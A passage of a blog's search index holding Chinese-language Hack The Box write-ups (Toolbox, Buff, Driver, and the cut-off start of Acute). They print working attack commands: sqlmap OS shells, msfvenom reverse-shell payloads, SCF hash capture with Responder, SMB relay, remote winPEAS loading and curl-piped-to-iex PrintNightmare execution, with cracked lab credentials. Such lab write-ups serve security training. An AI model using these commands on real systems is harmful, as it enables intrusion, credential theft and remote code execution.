<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Toolbox</title>
    <link href="/2024/08/31/Toolbox/"/>
    <url>/2024/08/31/Toolbox/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816114235.png"></p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816114326.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816114731.png"></p><blockquote><p>443web、21ftp匿名访问、22ssh(win7)<br>443证书暴露了域信息：admin.megalogistic.com</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.96.171 admin.megalogistic.com&quot;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816115123.png"></p><h2 id="0x02-ftp"><a href="#0x02-ftp" class="headerlink" title="0x02 ftp"></a>0x02 ftp</h2><blockquote><p>匿名登录后只有一个<code>docker-toolbox.exe</code></p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816115554.png"></p><blockquote><p>对该exe的研究暂时延后</p></blockquote><h2 id="0x03-smb"><a href="#0x03-smb" class="headerlink" title="0x03 smb"></a>0x03 smb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -N -L //10.129.96.171<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816115743.png"></p><h2 id="0x04-web"><a href="#0x04-web" class="headerlink" title="0x04 web"></a>0x04 web</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816115421.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816120417.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#强制https</span><br>sqlmap -r sql.txt --force-ssl<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816120708.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816121117.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816121130.png"></p><blockquote><p>admin@iamzeadmin</p></blockquote><p>本身也能万能密码进后台，所以用处不大，尝试写马：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r sql.txt --force-ssl --os-cmd <span class="hljs-built_in">id</span> --flush-session --batch<br></code></pre></td></tr></table></figure><blockquote><p>写马过程最好交给–batch，自己一个没选对就要报错：<code>unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported </code></p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816122451.png"></p><blockquote><p>可以通，且判断为linux，显然是在docker中，换os-shell反弹shell</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r sql.txt --force-ssl --os-shell --batch<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816122800.png"></p><h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> <br><span class="hljs-built_in">export</span> TERM=xterm-color<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816124322.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816141235.png"></p><blockquote><p>经典的docker ip，宿主机大概率就是172.17.0.2，传fscan探测：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fscan -h 172.17.0.1 -o 1.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816142100.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816154146.png"></p><blockquote><p>web页面和入口点的一样，唯一突破点在ssh</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816155751.png"></p><blockquote><p>似乎存在默认凭据，去官网查看</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816155821.png"></p><blockquote><p>确实是，docker@tcuser<br>本来是让正常用户的windows主机去使用管理toolbox的，但是这里能被我们的docker机访问到</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816160007.png"></p><blockquote><p>至此移动到了toolbox宿主机，还需要进一步移动到真正的windows宿主机，到了docker逃逸环节，上cdk：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./cdk eva --full<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816165418.png"></p><blockquote><p>看到了挂载了的<code>c:\users\administrator</code>下面有ssh的公私钥，验证后下载下来直接连接</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -y -e -f id_rsa<br>ssh-keygen -y -e -f id_rsa.pub<br></code></pre></td></tr></table></figure><blockquote><p><code>ssh-keygen -y -e -f &lt;file&gt;</code> 将返回密钥的公钥，因此可以使用它来检查私钥是否与公钥匹配</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816172743.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816170034.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Buff</title>
    <link href="/2024/08/31/Buff/"/>
    <url>/2024/08/31/Buff/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134222.png"></p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134721.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134804.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134911.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135404.png"></p><h2 id="0x02-web"><a href="#0x02-web" class="headerlink" title="0x02 web"></a>0x02 web</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135044.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135329.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135456.png"></p><blockquote><p>优先尝试命令执行</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135651.png"></p><blockquote><p>看起来是一个文件上传的getshell，用id参数访问触发</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135832.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -c <span class="hljs-string">&quot;gci -r -file c:\users&quot;</span><br>powershell -c <span class="hljs-string">&quot;gc C:\users\shaun\Desktop\user.txt&quot;</span><br></code></pre></td></tr></table></figure><h2 id="0x03-加固"><a href="#0x03-加固" class="headerlink" title="0x03 加固"></a>0x03 加固</h2><blockquote><p>开smb拿nc把shell反弹出来</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818143452.png"></p><blockquote><p>上线stowaway</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">start</span> <span class="hljs-string">&quot;&quot;</span> stow-agent-x64.exe -c <span class="hljs-number">10.10.16.8:5566</span> -s <span class="hljs-number">123456</span> --cs gbk --reconnect <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818152156.png"></p><blockquote><p>至此站稳了脚步</p></blockquote><h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><p>查询.net版本：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">reg query &quot;HKLM\SOFTWARE\Microsoft\<span class="hljs-built_in">NET</span> Framework Setup\NDP\v4\Full&quot; /v Release<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818152454.png"></p><blockquote><p>版本为4.8，放心用winpeas</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">start</span> &quot;&quot; <span class="hljs-built_in">cmd</span> /C &quot;winpeas-x64.exe log&quot;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818161022.png"></p><blockquote><p>发现了denfender</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818162757.png"></p><blockquote><p>奇怪的开在本地的进程，刚刚gci扫目录好像也看到了它的执行文件</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818162913.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818171538.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818171915.png"></p><blockquote><p>原poc执行的是calc.exe，用msfvenom生成反弹shell的shellcode替换</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.8 LPORT=4444 -b <span class="hljs-string">&#x27;\x00\x0A\x0D&#x27;</span> -f python -v payload<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240819105831.png"><br><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240819105838.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Driver</title>
    <link href="/2024/08/31/Driver/"/>
    <url>/2024/08/31/Driver/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812122200.png"></p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812122213.png"></p><blockquote><p>80web、135rpc、445smb、5985winrm(远程管理)</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812122013.png"><br><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812122112.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812121605.png"></p><h2 id="0x02-web"><a href="#0x02-web" class="headerlink" title="0x02 web"></a>0x02 web</h2><p>弱密码admin&#x2F;admin登进后台，打印机固件更新中心</p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812130420.png"></p><blockquote><p>泄露了域信息：driver.htb，尝试host碰撞</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812130747.png"></p><blockquote><p>暂时来看没什么收获</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812131756.png"></p><p>对唯一的功能点update测试：</p><blockquote><p>“选择打印机型号并上传相应的固件更新到我们的文件共享。我们的测试团队将手动审查上传并很快启动测试”</p></blockquote><h2 id="0x03-smb"><a href="#0x03-smb" class="headerlink" title="0x03 smb"></a>0x03 smb</h2><p>猜测和开放的445有关，用crackmapexec的ng版nxc(netexec)工具尝试枚举共享：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nxc smb driver.htb --shares -u FYHypo -p <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#凭据任意，列出共享</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812132338.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812132538.png"></p><blockquote><p>加上smbclient连接的结果判断无权连接</p></blockquote><p>可以再加一次enum4linux-ng枚举：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">enum4linux-ng driver.htb<br></code></pre></td></tr></table></figure><blockquote><p>返回测试文件上传，但因目录爆破没有结果，暂时放弃</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">feroxbuster -u http://driver.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php -H <span class="hljs-string">&quot;Authorization: Basic YWRtaW46YWRtaW4=&quot;</span><br></code></pre></td></tr></table></figure><h2 id="0x04-scf攻击"><a href="#0x04-scf攻击" class="headerlink" title="0x04 scf攻击"></a>0x04 scf攻击</h2><p>回到页面的提示：</p><blockquote><p>“选择打印机型号并上传相应的固件更新到我们的文件共享。我们的测试团队将手动审查上传并很快启动测试”</p></blockquote><p>可以给smb在Web页面传文件，且管理者会检查，很容易想到scf攻击去钓鱼管理者</p><p><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/?source=post_page-----1a850f23487b--------------------------------">SMB 共享 – SCF 文件攻击 – 渗透测试实验室 — SMB Share – SCF File Attacks – Penetration Testing Lab (pentestlab.blog)</a></p><h3 id="提取凭据"><a href="#提取凭据" class="headerlink" title="提取凭据"></a>提取凭据</h3><p>SCF（Shell 命令文件）文件可用于执行一组有限的操作，例如显示 Windows 桌面或打开 Windows 资源管理器，这并不新鲜。但是，SCF 文件可用于访问特定的 UNC (网络共享)路径，该文件将在用户打开该文件夹时自动执行。示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scf">[Shell]<br>Command=2<br>IconFile=\\10.10.16.6\FYHypo<br>[Taskbar]<br>Command=Explorer<br></code></pre></td></tr></table></figure><p>当用户浏览共享时，将自动从他的系统建立连接到 SCF 文件中包含的 UNC 路径。Windows 将尝试使用用户的用户名和密码对该共享进行身份验证。在该身份验证过程中，服务器会向客户端发送一个随机的 8 字节质询密钥，并且使用此质询密钥再次加密经过哈希处理的 NTLM&#x2F;LANMAN 密码。响应程序将捕获 NTLMv2 哈希。</p><blockquote><p>此时为了成为中间人我们需要responder起监听</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">responder -I tun0 -v<br></code></pre></td></tr></table></figure><p>上传scf文件后，拦截到NTLMv2 hash：</p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812170049.png"></p><blockquote><p>由于该hash和时间戳有关，同一个用户的hash也是在变化的，随便拉一个出来破解即可：</p></blockquote><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812170433.png"></p><blockquote><p>拿到用户凭据tony@liltony，之后可以即可winrm登录</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">evil-winrm -i 10.129.95.238 -u tony -p liltony<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812173103.png"></p><blockquote><p>gci递归找users中的flag:</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> <span class="hljs-literal">-r</span> <span class="hljs-operator">-file</span> c:\users<br><span class="hljs-built_in">gc</span> c:\users\tony\desktop\user.txt<br></code></pre></td></tr></table></figure><h3 id="附加命令执行"><a href="#附加命令执行" class="headerlink" title="附加命令执行"></a>附加命令执行</h3><blockquote><p>文章中还提到了利用msf进行中继攻击getshell的方式，尝试一下：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f exe &gt; fyhypo.exe<br></code></pre></td></tr></table></figure><p>利用smbrelayx.py设置中继时执行的命令(触发反弹shell)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbrelayx.py -h 10.129.95.238 -e ./fyhypo.exe<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs msf">use multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 10.10.16.6<br>set lport 4444<br></code></pre></td></tr></table></figure><p>当用户浏览共享时，SMB 服务器将接收连接，并使用用户名和密码哈希来验证其系统，并将有效负载执行到可写共享。</p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812171858.png"></p><blockquote><p>很奇怪为什么会是认证失败？凭证难道不是它提供的吗？</p></blockquote><h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h2><p>优先检索web目录：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ index.php <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812174155.png"></p><blockquote><p>看过内容后没有发现，进入自动枚举阶段</p></blockquote><p>传winpeas执行，保存到log，下载到本地用less查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs winrm">cd :\programdata\app<br>upload winpeas-x64.exe<br>.\winpeas-x64.exe log<br>download out.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> out.txt | less -R --mouse<br><span class="hljs-comment">#按q退出</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812205429.png"></p><p>补充：winpeas可以在内存中用反射实现不落地运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#先调整执行策略</span><br><span class="hljs-built_in">set-executionpolicy</span> unrestricted <span class="hljs-literal">-scope</span> currentuser<br><span class="hljs-comment">#反射加载</span><br><span class="hljs-variable">$wp</span>=[<span class="hljs-type">System.Reflection.Assembly</span>]::Load([<span class="hljs-built_in">byte</span>[]](<span class="hljs-built_in">Invoke-WebRequest</span> <span class="hljs-string">&quot;http://10.10.16.2:8000/winpeas-x64.exe&quot;</span> <span class="hljs-literal">-UseBasicParsing</span> | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-ExpandProperty</span> Content)); [<span class="hljs-type">winPEAS.Program</span>]::Main(<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812190316.png"><br><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812192041.png"></p><blockquote><p>虽然本题可能由于winpeas太大无法直接加载进内存导致无法运行，但这种隐藏自己的思维要有</p></blockquote><p>不过这个问题可以通过在cmd中强制使用64位powershell解决：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#先nc反弹个<span class="hljs-built_in">cmd</span>的shell出来<br><span class="hljs-function">C:\<span class="hljs-title">Windows</span>\<span class="hljs-title">SysNative</span>\<span class="hljs-title">WindowsPowerShell</span>\<span class="hljs-title">v1</span>.0\<span class="hljs-title">powershell.exe</span> -<span class="hljs-title">Command</span> &quot;<span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest</span> &#x27;<span class="hljs-title">http</span>://10.10.16.2:8000/<span class="hljs-title">winpeas</span>-<span class="hljs-title">x64.exe</span>&#x27; -<span class="hljs-title">OutFile</span> &#x27;<span class="hljs-title">winpeas</span>-<span class="hljs-title">x64.exe</span>&#x27;; ./<span class="hljs-title">winpeas</span>-<span class="hljs-title">x64.exe</span> --<span class="hljs-title">help</span>&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812214253.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812222053.png"></p><blockquote><p>优先关注到spoolsv服务，结合靶机名称很容易想到打spoolsv的打印机漏洞，如Spooler、PetitPotam、PrintNightmare，优先关注到最常见的PrintNightmare</p></blockquote><p>使用nxc的printnightmare模块检查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nxc smb driver.htb -u tony -p liltony -printnightmare<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812223800.png"></p><p><a href="https://github.com/calebstewart/CVE-2021-1675?source=post_page-----1a850f23487b--------------------------------">calebstewart&#x2F;CVE-2021-1675: Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare) (github.com)</a></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812224047.png"></p><blockquote><p>两种利用模式，添加管理员用户或执行恶意dll(可以为msf反弹shell的payload)</p></blockquote><p>1、添加管理员用户</p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812225338.png"></p><blockquote><p>得到的是administrator的shell</p></blockquote><p>2、反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -a x64 -p windows/x64/shell_reverse_tcp lport=9999 lhost=10.10.16.6 -f dll -o fyhypo.dll<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812230744.png"></p><blockquote><p>得到的是system的shell</p></blockquote><p>补充：也可以用github下载的本地python脚本进行攻击</p><p>另外，该过程也可由msf完成：</p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812235342.png"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p><strong>导入ps1模块受阻</strong></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240813000105.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240813000115.png"></p><blockquote><p>如果在尝试导入模块时，被执行策略阻止，如上图，则可以尝试使用curl+管道符解决：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.6</span>/CVE<span class="hljs-literal">-2021-1675</span>.ps1 <span class="hljs-literal">-UseBasicParsing</span> | <span class="hljs-built_in">iex</span><br><span class="hljs-comment">#-UseBasicParsing将允许文件返回，即使 IE 引擎不可用</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/08/31/Acute/"/>
    <url>/2024/08/31/Acute/</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-Acute"><a href="#HTB-Acute" class="headerlink" title="[HTB] Acute"></a>[HTB] Acute</h1><ul><li>[[#0x01 端口扫描|0x01 端口扫描]]</li><li>[[#0x02 web|0x02 web]]</li><li>[[#0x03 PSWA|0x03 PSWA]]<ul><li>[[#0x03 PSWA#edavies@Acute-PC01|edavies@Acute-PC01]]</li></ul></li><li>[[#0x04 稳固立足点|0x04 稳固立足点]]</li><li>[[#0x05 横向移动|0x05 横向移动]]<ul><li>[[#0x05 横向移动#imonks@ATSSERVER|imonks@ATSSERVER]]</li><li>[[#0x05 横向移动#jmorgan@Acute-PC01|jmorgan@Acute-PC01]]</li><li>[[#0x05 横向移动#awallace@ATSSERVER|awallace@ATSSERVER]]</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821165729.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820105606.png"></p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820105915.png"></p><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820110027.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.136.40 atsserver.acute.local acute.local&quot;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br></code></pre></td></tr></table></figure><h2 id="0x02-web"><a href="#0x02-web" class="headerlink" title="0x02 web"></a>0x02 web</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820110532.png"></p><figure 